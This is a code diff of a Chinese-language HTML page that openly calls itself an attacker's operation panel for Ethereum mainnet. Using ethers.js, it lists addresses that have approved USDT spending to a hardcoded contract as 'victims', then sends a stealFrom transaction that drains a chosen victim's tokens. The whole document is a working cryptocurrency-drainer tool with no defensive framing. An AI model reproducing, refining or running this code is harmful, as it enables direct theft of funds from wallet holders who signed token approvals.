@@ -1,68 +1,83 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🛠️ 攻擊者操作介面 v3.1.1</title>
+  <title>🛠️ 攻擊者操作介面 v3.1.2（Ethereum 主網）</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: 'Arial'; padding: 20px; background: #fff; }
+    .ok { color: green; }
+    .bad { color: red; }
+  </style>
 </head>
 <body>
-  <h2>🛠️ 攻擊者操作介面 v3.1.1（Ethereum 主網）</h2>
-  <p>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></p>
-  <p>目前登入帳號：<span id="account">未連線</span></p>
-  <p>✅ 身份驗證：你是攻擊者本人</p>
-  <input id="victim" placeholder="受害者地址">
-  <button onclick="drain()">執行盜取</button>
-  <p>⛏️ 等待操作...</p>
-  <h4>📜 最近授權地址列表：</h4>
-  <ul id="list"></ul>
+  <h2>🛠️ 攻擊者操作介面 v3.1.2（Ethereum 主網）</h2>
+  <p><b>合約地址：</b><span id="contract">0xFbe9c4748A267562f723C67db673943F901533D6</span></p>
+  <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
+  <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
+  <br>
+  <input id="input" placeholder="受害者地址" />
+  <button onclick="steal()">執行盜取</button>
+  <p id="status">等待操作...</p>
+  <h3>📌 授權地址列表：</h3>
+  <ul id="victims"></ul>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const contractAddress = "0xFbe9c4748A267562f723C67db673943F901533D6";
-    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const abi = [{ "name": "stealFrom", "type": "function", "inputs": [
-      { "type": "address", "name": "victim" }
-    ], "outputs": [], "constant": false }];
-    const erc20abi = [
-      { "name": "allowance", "type": "function", "inputs": [
-        { "type": "address", "name": "owner" },
-        { "type": "address", "name": "spender" }
-      ], "outputs": [{ "type": "uint256", "name": "" }], "constant": true },
-    ];
+    const CONTRACT = "0xFbe9c4748A267562f723C67db673943F901533D6";
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const ABI = ["event Approval(address indexed owner,address indexed spender,uint256 value)"];
+    let provider, signer, attacker;
 
-    async function load() {
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.enable();
-      const accounts = await web3.eth.getAccounts();
-      document.getElementById("account").innerText = accounts[0];
+    async function connect() {
+      if (!window.ethereum) return alert("請安裝 MetaMask");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      attacker = await signer.getAddress();
+      document.getElementById("account").innerText = attacker;
+      document.getElementById("auth").innerText = "你是攻擊者本人";
+      document.getElementById("auth").className = "ok";
+      fetchApprovals();
+    }
 
-      const history = JSON.parse(localStorage.getItem("history") || "[]");
-      const list = document.getElementById("list");
-      const erc20 = new web3.eth.Contract(erc20abi, tokenAddress);
-      for (const addr of history) {
-        const allowance = await erc20.methods.allowance(addr, contractAddress).call();
-        if (allowance > 0) {
+    async function fetchApprovals() {
+      const contract = new ethers.Contract(USDT, ABI, provider);
+      const events = await contract.queryFilter(
+        contract.filters.Approval(null, CONTRACT),
+        19000000
+      );
+      const ul = document.getElementById("victims");
+      ul.innerHTML = "";
+      const addresses = new Set();
+      events.reverse().forEach(ev => {
+        if (!addresses.has(ev.args.owner)) {
+          addresses.add(ev.args.owner);
           const li = document.createElement("li");
-          li.innerText = addr;
-          list.appendChild(li);
+          li.innerText = ev.args.owner;
+          ul.appendChild(li);
         }
-      }
+      });
     }
 
-    async function drain() {
-      const web3 = new Web3(window.ethereum);
-      const contract = new web3.eth.Contract(abi, contractAddress);
-      const accounts = await web3.eth.getAccounts();
-      const victim = document.getElementById("victim").value;
+    async function steal() {
+      const victim = document.getElementById("input").value;
+      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
+      const data = iface.encodeFunctionData("stealFrom", [victim]);
+      const tx = {
+        to: CONTRACT,
+        data: data
+      };
+      document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
       try {
-        await contract.methods.stealFrom(victim).send({ from: accounts[0] });
-        alert("✅ 執行成功");
+        const sent = await signer.sendTransaction(tx);
+        document.getElementById("status").innerText = "✅ TX Hash: " + sent.hash;
       } catch (e) {
-        alert("❌ 錯誤：" + e.message);
+        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
       }
     }
 
-    load();
+    connect();
   </script>
 </body>
 </html>
